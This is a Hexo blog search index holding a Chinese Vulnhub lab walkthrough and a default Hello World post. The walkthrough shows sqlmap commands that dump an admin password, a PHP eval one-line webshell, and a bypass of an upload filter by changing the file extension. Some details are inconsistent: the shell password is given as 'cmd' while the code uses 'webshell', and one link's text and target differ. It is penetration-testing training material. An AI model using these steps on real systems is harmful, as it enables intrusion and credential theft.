<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub靶机实战：from_sqli_to_shell_i386</title>
      <link href="/posts/3f12.html"/>
      <url>/posts/3f12.html</url>
      
        <content type="html"><![CDATA[<h2 id="靶机官网："><a href="#靶机官网：" class="headerlink" title="靶机官网："></a>靶机官网：</h2><p><a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/" title="https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;pentester-lab-from-sql-injection-to-shell,80&#x2F;">https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/</a></p><h2 id="靶机镜像ISO下载地址：（转链）"><a href="#靶机镜像ISO下载地址：（转链）" class="headerlink" title="靶机镜像ISO下载地址：（转链）"></a>靶机镜像ISO下载地址：（转链）</h2><p><a href="http://4275.com/anqxun" title="from_sqli_to_shell_i386.iso - 4275.COM">from_sqli_to_shell_i386.iso - 4275.COM</a></p><hr><h2 id="一、启动靶机"><a href="#一、启动靶机" class="headerlink" title="一、启动靶机"></a>一、启动靶机</h2><p><img src="https://i-blog.csdnimg.cn/direct/5a4fd41092d44bbe818c8cdde4365ebb.png"><img src="https://i-blog.csdnimg.cn/direct/6cc6781b117d4d0fb19c9b5dcaafe880.png"><img src="https://i-blog.csdnimg.cn/direct/e494819a888c4997bb06a236b9141496.png"></p><hr><h2 id="二、查找靶机-IP-地址（2种方法）"><a href="#二、查找靶机-IP-地址（2种方法）" class="headerlink" title="二、查找靶机 IP 地址（2种方法）"></a><strong>二、查找靶机 IP 地址（2种方法）</strong></h2><h3 id="1-使用-netdiscover-命令："><a href="#1-使用-netdiscover-命令：" class="headerlink" title="1.使用 netdiscover 命令："></a><strong>1.使用 netdiscover 命令</strong>：</h3><p>在 Kali 终端中，输入 netdiscover 命令，该命令会自动扫描局域网内的活跃主机，尝试查找靶机的 IP 地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/a9d3d3ed58f44b479b0bcf8603aec8f5.png"></p><h3 id="2-使用-arp-scan-命令："><a href="#2-使用-arp-scan-命令：" class="headerlink" title="2.使用 arp - scan 命令："></a><strong>2.使用 arp - scan 命令</strong>：</h3><p>执行 arp - scan - l - D 命令，对同网段下的主机进行扫描。此命令通过发送 ARP 请求并接收响应，来获取局域网内设备的 IP 地址和 MAC 地址信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -D</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/028deb31268a473e80680f8203de2229.png"></p><hr><h2 id="三、端口扫描与服务探测"><a href="#三、端口扫描与服务探测" class="headerlink" title="三、端口扫描与服务探测"></a>三、端口扫描与服务探测</h2><h3 id="1-全端口扫描："><a href="#1-全端口扫描：" class="headerlink" title="1.全端口扫描："></a><strong>1.全端口扫描</strong>：</h3><p>nmap –min - rate 10000 - p - 192.168.16.132 命令对靶机进行全端口扫描。该命令以较高的扫描速率（每分钟至少 10000 个数据包）探测靶机上开放的所有 TCP 端口。扫描结果显示，靶机开放了 22 端口（SSH 服务）和 80 端口（HTTP 服务）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min - rate 10000 - p - 192.168.16.132</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/8d63dc54dd6245398acf36e1675623aa.png"></p><h3 id="2-对80端口详细扫描："><a href="#2-对80端口详细扫描：" class="headerlink" title="2.对80端口详细扫描："></a><strong>2.对80端口详细扫描</strong>：</h3><p>针对开放的 80 端口，执行 nmap - sT - sC - sV - O - p80 192.168.16.132 命令。此命令在进行 TCP 连接扫描（-sT）的同时，还会运行一系列默认脚本（-sC）来检测常见的漏洞和服务信息，获取服务版本（-sV）以及尝试识别靶机操作系统（-O）。扫描结果表明，80 端口运行的是 Apache httpd 2.2.16 版本（基于 Debian 系统），操作系统为 Linux，内核版本在 2.6.32 - 2.6.35 之间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap - sT - sC - sV - O - p80 192.168.16.132</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/9472523c21304c06a2331a2825c95ce3.png"></p><hr><h2 id="四、浏览器访问靶机-IP"><a href="#四、浏览器访问靶机-IP" class="headerlink" title="四、浏览器访问靶机 IP"></a>四、浏览器访问靶机 IP</h2><p>在确定靶机开放 80 端口且运行着 Web 服务后，我们在浏览器中输入靶机 IP 地址 192.168.16.132 进行访问。打开页面后，呈现出一个名为 “My Awesome Photoblog” 的网站，页面展示了一些图片相关的内容，如 “last picture: cthulhu” 等信息，同时右侧有 “Admin” 选项卡。</p><p><img src="https://i-blog.csdnimg.cn/direct/66fa776a96684e1cafe5c5e61384a170.png"></p><hr><h2 id="五、寻找sql注入漏洞（2种方法）"><a href="#五、寻找sql注入漏洞（2种方法）" class="headerlink" title="五、寻找sql注入漏洞（2种方法）"></a>五、寻找sql注入漏洞（2种方法）</h2><h3 id="1-nmap漏洞脚本扫描"><a href="#1-nmap漏洞脚本扫描" class="headerlink" title="1.nmap漏洞脚本扫描"></a>1.nmap漏洞脚本扫描</h3><p>使用 nmap –script &#x3D; vuln - p80 192.168.16.132 命令尝试利用 nmap 的漏洞脚本扫描 80 端口的漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script = vuln - p80 192.168.16.132 </span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/9add5ece33754d769586afe42cf7388b.png"></p><p>发现了了大量的SQL注入点：</p><blockquote><p>| http-sql-injection: <br>|   Possible sqli for queries:<br>|     <a href="http://192.168.16.132/cat.php?id=2%27%20OR%20sqlspider">http://192.168.16.132:80/cat.php?id=2%27%20OR%20sqlspider</a><br>|     <a href="http://192.168.16.132/cat.php?id=1%27%20OR%20sqlspider">http://192.168.16.132:80/cat.php?id=1%27%20OR%20sqlspider</a><br>|     <a href="http://192.168.16.132/cat.php?id=3%27%20OR%20sqlspider">http://192.168.16.132:80/cat.php?id=3%27%20OR%20sqlspider</a></p></blockquote><h3 id="2-从页面url中id参数下手，找sql注入点"><a href="#2-从页面url中id参数下手，找sql注入点" class="headerlink" title="2.从页面url中id参数下手，找sql注入点"></a>2.从页面url中id参数下手，找sql注入点</h3><h4 id="（1）发现登录Admin后台界面与潜在-SQL-注入漏洞"><a href="#（1）发现登录Admin后台界面与潜在-SQL-注入漏洞" class="headerlink" title="（1）发现登录Admin后台界面与潜在 SQL 注入漏洞"></a>（1）发现登录Admin后台界面与潜在 SQL 注入漏洞</h4><p>点击 <strong>“Admin”</strong> 选项卡后，进入到一个后台管理的登录界面。</p><p>为了登录成功，我们需要找到有效的用户名和密码。</p><p><img src="https://i-blog.csdnimg.cn/direct/e87b7ff04abc4b388ca6682b35b7016e.png"></p><p>在对网站进行初步探索时，我们点击了右侧的各个选项卡，并观察每个页面的 URL。</p><p><img src="https://i-blog.csdnimg.cn/direct/8150c267ab1e4e6984287e29c991d99a.png"><img src="https://i-blog.csdnimg.cn/direct/efdaf577fae0466885e0c653ea7beb99.png"><img src="https://i-blog.csdnimg.cn/direct/def78060ff0341c190a44f86094a8e71.png"></p><p>发现多个页面都是通过 GET 方式将<strong>参数 id</strong> 传递给 <strong>cat.php 文件</strong>来获取不同的内容，例如访问 <strong>192.168.16.132&#x2F;cat.php?id &#x3D; 1</strong>、<strong>192.168.16.132&#x2F;cat.php?id &#x3D; 2</strong> 等不同的 id 值会返回不同的图片信息。这种动态参数传递的方式存在 SQL 注入的可能性，因为攻击者可能通过构造恶意的 id 参数值来篡改数据库查询逻辑。</p><h4 id="（2）确定-SQL-注入点"><a href="#（2）确定-SQL-注入点" class="headerlink" title="（2）确定 SQL 注入点"></a>（2）确定 SQL 注入点</h4><p>为了验证 SQL 注入点的存在，我们使用万能测试语句 “<strong>or 1 &#x3D; 1#</strong>” 进行测试。将其添加到 URL 参数中，即访问 <strong>192.168.16.132&#x2F;cat.php?id &#x3D; 1 or 1 &#x3D; 1#</strong>。</p><p><img src="https://i-blog.csdnimg.cn/direct/713440dcc48f4786b37721db5291443e.png"></p><p>经过测试，页面内容发生改变且符合预期，显示了更多的图片信息，这表明成功找到了 SQL 注入点。</p><hr><h2 id="六、SQL-注入漏洞利用与信息获取"><a href="#六、SQL-注入漏洞利用与信息获取" class="headerlink" title="六、SQL 注入漏洞利用与信息获取"></a>六、SQL 注入漏洞利用与信息获取</h2><h4 id="1-使用-sqlmap-扫描数据库"><a href="#1-使用-sqlmap-扫描数据库" class="headerlink" title="1.使用 sqlmap 扫描数据库"></a>1.使用 sqlmap 扫描数据库</h4><p>确定注入点后，我们借助强大的 sqlmap 工具来进一步探索数据库信息。</p><p>执行下面命令（2选一）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> --dbs --batch​</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.16.132:80/cat.php?id=2%27%20OR%20sqlspider&quot;</span> -dbs</span><br></pre></td></tr></table></figure><p>会自动检测并利用注入点，尝试获取数据库列表。</p><p><img src="https://i-blog.csdnimg.cn/direct/5f226a93edea46df82dddcf05fbe9e3b.png"></p><blockquote><p><strong>fetching database names：</strong></p><p><strong>available databases [2]:<br>[*] information_schema<br>[*] photoblog</strong></p></blockquote><p>扫描结果显示靶机存在两个数据库，分别是 information_schema（MySQL 系统数据库，用于存储数据库元数据信息）和 photoblog（该摄影博客网站应用所使用的数据库）。</p><h4 id="2-爆破-photoblog-数据库中的表"><a href="#2-爆破-photoblog-数据库中的表" class="headerlink" title="2.爆破 photoblog 数据库中的表"></a>2.爆破 photoblog 数据库中的表</h4><p>接着，我们对 photoblog 数据库中的表进行爆破。使用 sqlmap - u “<a href="http://192.168.16.132/cat.php?id" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;cat.php?id">http://192.168.16.132/cat.php?id</a> &#x3D; 1” - D photoblog –tables –batch 命令，sqlmap 将尝试获取 photoblog 数据库中的所有表名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> - D photoblog --tables --batch</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/347ac3dc32ba43a6b75de3dd195b0502.png">经过一段时间的扫描，成功获取到三个表名：categories（可能用于存储图片分类信息）、pictures（可能存储图片相关数据）和 users（推测用于存储用户信息）。</p><h4 id="3-获取-users-表的字段名"><a href="#3-获取-users-表的字段名" class="headerlink" title="3.获取 users 表的字段名"></a>3.获取 users 表的字段名</h4><p>进一步深入，我们需要获取 users 表中的字段名。执行 sqlmap - u “<a href="http://192.168.16.132/cat.php?id" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;cat.php?id">http://192.168.16.132/cat.php?id</a> &#x3D; 1” - D photoblog - T users –columns –batch 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> - D photoblog - T <span class="built_in">users</span> --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/164c15a9c6114bf9a6ea8f50f1fc4a82.png"></p><p>sqlmap 成功获取到 users 表中的三个字段：id（数据类型为 mediumint (9)，可能是用户 ID）、login（varchar (50)，推测为用户名）和 password（varchar (50)，显然是用户密码）。</p><h4 id="4-获取-users-表中的用户数据"><a href="#4-获取-users-表中的用户数据" class="headerlink" title="4.获取 users 表中的用户数据"></a>4.获取 users 表中的用户数据</h4><p>最后，我们使用 sqlmap - u “<a href="http://192.168.16.132/cat.php?id" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;cat.php?id">http://192.168.16.132/cat.php?id</a> &#x3D; 1” - D photoblog - T users - C id,login,password –dump –batch 命令来获取 users 表中这些字段的具体文本内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> - D photoblog - T <span class="built_in">users</span> - C <span class="built_in">id</span>,login,password --dump --batch</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/4cf67927b7a34777872967177f29cc12.png"></p><p>经过爆破，我们成功获取到一条用户记录，其中用户名是 “admin”，密码的 MD5 值为 “8efe310f9ab3efeae8d410a8e0166eb2”。幸运的是，sqlmap 直接为我们解密了密码的 MD5 值，得到密码为 “P4ssw0rd”。</p><h4 id="5-登录后台管理系统"><a href="#5-登录后台管理系统" class="headerlink" title="5.登录后台管理系统"></a>5.登录后台管理系统</h4><p>有了用户名和密码，我们返回登录界面，输入 “admin” 和 “P4ssw0rd” 进行登录。</p><p><img src="https://i-blog.csdnimg.cn/direct/5b096e2df86c42d7aeeedaf12dba7069.png"></p><p><img src="https://i-blog.csdnimg.cn/direct/d88cd24f4ba5401dbf035b88784cefdc.png"></p><p>登录成功后，进入到后台管理页面，页面显示了图片管理相关的功能，包括查看图片、删除图片以及添加新图片等操作。</p><p><img src="https://i-blog.csdnimg.cn/direct/92fdfa7620e14430ae8ca1911eca0d42.png"></p><p>这个表是一个图片表，名称是一个herf，可以直接查看，后面的delete应该也是可以删除这张图片</p><hr><h2 id="七、文件上传漏洞利用与获取-Shell"><a href="#七、文件上传漏洞利用与获取-Shell" class="headerlink" title="七、文件上传漏洞利用与获取 Shell"></a>七、文件上传漏洞利用与获取 Shell</h2><h3 id="1-文件上传功能测试"><a href="#1-文件上传功能测试" class="headerlink" title="1.文件上传功能测试"></a>1.文件上传功能测试</h3><p><img src="https://i-blog.csdnimg.cn/direct/7106535805a641efacef2e4b060c9a15.png"><img src="https://i-blog.csdnimg.cn/direct/77278cb7555b47638cea7ce653c255af.png"></p><p>在后台管理页面中，我们注意到 “Add a new picture” 按钮，点击后发现可以上传文件。这意味着着可能存在通过文件上传功能获取更高权限的途径，例如上传恶意文件（如病毒木马）来控制靶机。</p><h3 id="2-上传-PHP-文件失败"><a href="#2-上传-PHP-文件失败" class="headerlink" title="2.上传 PHP 文件失败"></a>2.上传 PHP 文件失败</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;webshell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/351f943a9050477ea6e279afb7170f87.png"></p><p>在 Kali 系统中，我们创建一个包含一句话木马的 PHP 文件（命名为abc.php），尝试通过文件上传功能将其上传到靶机。</p><p><img src="https://i-blog.csdnimg.cn/direct/78d6966bd7c5487cb569102d0727ae0f.png"></p><p>、然而，上传失败！靶机显示 “No PHP!!”，这表明靶机对上传的文件进行了过滤，禁止直接上传 PHP 文件。</p><h3 id="3-绕过文件上传过滤"><a href="#3-绕过文件上传过滤" class="headerlink" title="3.绕过文件上传过滤"></a>3.绕过文件上传过滤</h3><p>经过初步分析，猜测靶机是通过检测文件后缀名来过滤上传文件的，即禁止上传后缀名为**.php** 的文件。为了绕过这个限制，我们将 PHP 文件的后缀名由原来的**.php<strong>修改为</strong>.Php**，然后再次尝试上传。</p><p><img src="https://i-blog.csdnimg.cn/direct/5f776f36ad1e4c87a81632b754c91474.png"><img src="https://i-blog.csdnimg.cn/direct/71cb63f262104c898f45e52de7376a75.png"></p><p>这次上传成功了，这进一步证实了我们的猜测，即靶机的上传检测机制仅针对文件后缀名，而未对文件内容进行检测。</p><h3 id="4-寻找上传文件的存储位置"><a href="#4-寻找上传文件的存储位置" class="headerlink" title="4.寻找上传文件的存储位置"></a>4.寻找上传文件的存储位置</h3><p>虽然上传的文件（伪装成.Php格式）成功上传到了靶机，但由于其实际上是一个 PHP 文件，我们需要找到一种方法使其能够被服务器解析为 PHP 脚本，从而执行我们的木马代码。</p><p>为此，我们使用 dirb 命令扫描网站后台目录，希望找到上传文件的存储位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​dirb http://192.168.16.132</span><br></pre></td></tr></table></figure><p>执行 dirb <a href="http://192.168.16.132/" title="http:&#x2F;&#x2F;192.168.16.132">http://192.168.16.132</a>命令后，我们发现了一个名为 “uploads” 的目录，根据其名称和网站的逻辑，我们推测上传的文件很可能保存在这个目录中</p><p><img src="https://i-blog.csdnimg.cn/direct/397a1168e70941af868eacd6eebb87a7.png"></p><h3 id="5-确认上传文件的访问路径"><a href="#5-确认上传文件的访问路径" class="headerlink" title="5.确认上传文件的访问路径"></a>5.确认上传文件的访问路径</h3><h4 id="（1）查找上传文件的保存目录"><a href="#（1）查找上传文件的保存目录" class="headerlink" title="（1）查找上传文件的保存目录"></a>（1）查找上传文件的保存目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​dirb http://192.168.16.132/admin/uploads - w</span><br></pre></td></tr></table></figure><p>为了验证我们的推测，我们使用 dirb 命令再次查看指定目录，执行 dirb <a href="http://192.168.16.132/admin/uploads" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;admin&#x2F;uploads">http://192.168.16.132/admin/uploads</a> - w 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​dirb http://192.168.16.132/admin/uploads - w</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/a9353e6c9bec445aa15e9619294a5da9.png"></p><h4 id="（2）通过后缀名-Php来验证文件保存位置"><a href="#（2）通过后缀名-Php来验证文件保存位置" class="headerlink" title="（2）通过后缀名.Php来验证文件保存位置"></a>（2）通过后缀名.Php来验证文件保存位置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​dirb http://192.168.16.132/admin/uploads - w -X .Php</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/349f1c7cd20349f2940704569226158f.png"></p><p>从扫描结果中，我们成功找到了我们上传的文件 “abc.Php”。并且发现其访问路径为<a href="http://192.168.16.132/admin/uploads/webshell.Php" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;admin&#x2F;uploads&#x2F;abc.Php">http://192.168.16.132/admin/uploads/abc.Php</a>。</p><h3 id="6-访问上传文件并获取-Shell"><a href="#6-访问上传文件并获取-Shell" class="headerlink" title="6.访问上传文件并获取 Shell"></a>6.访问上传文件并获取 Shell</h3><p> <img src="https://i-blog.csdnimg.cn/direct/9c0176b263054c4f9630e6bde7c346b6.png"></p><p>在浏览器中访问<a href="http://192.168.16.132/admin/uploads/webshell.Php" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;admin&#x2F;uploads&#x2F;abc.Php">http://192.168.16.132/admin/uploads/abc.Php</a>，如果一切顺利，我们的一句话木马将被执行，此时我们可以使用工具（如中国蚁剑或其他类似的 WebShell 管理工具）连接到这个地址，通过在工具中输入密码（这里是 “cmd”，与我们在一句话木马中设置的密码一致），成功连接后，我们就获取了靶机的 Shell 权限，可以在靶机上执行各种命令，进一步深入探索靶机系统，完成渗透测试的目标。</p><hr>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
            <tag> Sqlmap </tag>
            
            <tag> nmap </tag>
            
            <tag> from_sqli_to_shell_i386 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/3eeb.html"/>
      <url>/posts/3eeb.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 博文 </category>
          
          <category> 日常记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hello World </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
